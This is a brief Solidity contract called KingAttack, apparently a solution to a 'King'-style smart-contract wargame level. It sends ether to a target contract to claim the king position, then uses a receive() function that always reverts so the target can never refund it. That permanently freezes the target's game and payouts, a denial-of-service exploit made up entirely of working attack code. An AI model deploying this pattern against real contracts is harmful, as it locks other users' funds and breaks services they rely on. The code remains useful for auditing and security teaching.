// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

contract KingAttack {

    function claimOwnership(address _kingAddress) external payable {
        (bool success,) = payable(_kingAddress).call{value:msg.value}("");
        require(success,"transaction failed");
    }

    receive() external payable {
        revert();
    }
}